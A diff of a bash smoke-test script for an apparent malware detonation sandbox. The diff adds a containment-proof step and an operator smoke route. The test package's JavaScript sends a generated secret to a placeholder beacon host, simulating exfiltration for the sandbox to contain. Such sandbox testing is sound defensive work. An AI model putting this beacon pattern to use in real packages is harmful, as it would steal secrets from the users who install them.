@@ -1,9 +1,12 @@
 #!/usr/bin/env bash
 # Template build smoke detonation (DESIGN.md section 3.1). Runs as root at the end
-# of the template build. Detonates a local test package (written here, our own
-# code) through the real cr-detonate.sh and asserts the forge, the inner fence,
-# the fake clock and npm 11 dependency lifecycle scripts all work. Then it
-# restores the template to a clean state so no smoke artifact reaches a scan VM.
+# of the template build, and again in a fresh VM through the operator-only preview
+# route POST /api/ops/smoke. Detonates a local test package (written here, our own
+# code) through the real cr-detonate.sh and asserts the forge, the inner fence, the
+# fake clock and npm 11 dependency lifecycle scripts all work, and prints the
+# containment proof (cr-proof.sh: forge as root, skuid 1001 rules, drop counters,
+# forged replies). Then it restores the template to a clean state so no smoke
+# artifact reaches a scan VM.
 set -euo pipefail
 
 fail() { echo "cr-smoke: FAIL $*" >&2; exit 1; }
@@ -31,7 +34,7 @@ https.get("https://smoke.cr-fixture.invalid/beacon?k=" + encodeURIComponent(key)
 }).on("error", (e) => { fs.writeFileSync("/tmp/cr-smoke-result", "error " + e.message); });
 JS
 tar -czf /root/in/target.tgz -C /tmp/cr-smoke package
-printf '{"mode":"npm-package","name":"cr-smoke-pkg","install_timeout_s":60,"entry_timeout_s":8,"fake_rate":30}\n' >/root/in/run.json
+printf '{"mode":"npm-package","name":"cr-smoke-pkg","install_timeout_s":60,"entry_timeout_s":8,"fake_rate":30,"proof":true}\n' >/root/in/run.json
 SECRET="crsmoke$(rand 24)"
 umask 077
 {
@@ -46,6 +49,12 @@ umask 022
 
 /opt/cr/bin/cr-detonate.sh
 OUT=/root/out
+
+# The containment proof cr-detonate.sh ran with the forge and the fence up.
+echo "cr-smoke: ---- containment proof (inside the VM, before any repo code) ----"
+cat "$OUT/proof.txt" 2>/dev/null || echo "cr-smoke: proof.txt missing"
+echo "cr-smoke: ---- end of proof ----"
+jq -s -e 'map(select(.name=="containment_proof" and .ok)) | length == 1' "$OUT/checks.jsonl" >/dev/null || fail "containment proof failed: $(cat "$OUT/checks.jsonl")"
 
 jq -e '.install.status == "completed"' "$OUT/result.json" >/dev/null || fail "install did not complete: $(cat "$OUT/result.json") $(tail -c 2000 "$OUT/install.err")"
 jq -e '.entry.status == "completed"' "$OUT/result.json" >/dev/null || fail "entry did not complete: $(tail -c 2000 "$OUT/entry.err")"
